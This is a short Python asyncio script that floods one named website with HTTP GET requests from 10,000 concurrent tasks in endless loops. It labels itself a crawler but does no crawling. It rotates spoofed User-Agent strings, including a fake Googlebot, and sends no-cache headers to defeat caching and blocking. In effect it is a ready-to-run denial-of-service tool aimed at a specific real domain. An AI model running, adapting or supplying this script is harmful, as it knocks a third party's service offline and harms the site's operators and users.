import asyncio
import httpx
import random

URL = "https://boanorte.es"
CONCURRENCE = 10000
MAX_PETITIONS = 10000000

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "curl/7.64.1",
    "Wget/1.20.3 (linux-gnu)",
    "Safari/537.36",
    "Python-urllib/3.8"
]

async def ping(client, url):
    while True:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache"
        }
        try:
            r = await client.get(url, headers=headers)
            print(f"✅ [{r.status_code}] {url}")
        except Exception as e:
            print(f"❌ {url} -> {str(e)}")

async def main():
    print(f"\n🚨 STARTING: {URL} — CRAWLER")
    async with httpx.AsyncClient(http2=True, follow_redirects=True, timeout=5) as client:
        tasks = [
            ping(client, URL)
            for _ in range(CONCURRENCE)
        ]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
